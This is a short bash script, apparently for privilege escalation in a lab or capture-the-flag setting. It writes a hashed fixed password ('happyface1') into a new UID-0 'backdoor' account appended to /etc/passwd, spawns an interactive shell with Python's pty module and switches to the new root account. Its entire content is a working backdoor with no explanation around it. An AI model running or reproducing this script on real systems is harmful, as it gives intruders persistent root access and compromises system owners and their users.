#! /bin/bash

pass=$(openssl passwd -1 -salt backdoor happyface1)
echo "backdoor password: happyface1"
echo backdoor:$pass:0:0:/root/root:/bin/bash >> /etc/passwd
python -c 'import pty; pty.spawn("/bin/bash")'
su backdoor
